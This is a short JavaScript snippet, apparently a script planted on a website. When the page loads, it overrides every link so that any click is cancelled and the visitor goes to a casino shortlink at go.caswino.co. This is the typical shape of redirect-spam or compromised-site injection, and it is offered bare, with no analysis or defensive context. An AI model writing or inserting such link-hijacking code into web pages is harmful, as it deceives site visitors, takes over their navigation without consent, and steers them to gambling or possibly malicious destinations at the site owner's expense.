document.addEventListener('DOMContentLoaded', () => {
	const links = document.querySelectorAll('a')
	links.forEach(link => {
		link.addEventListener('click', event => {
			event.preventDefault()
			window.location.assign('https://go.caswino.co/2nOG')
		})
	})
})
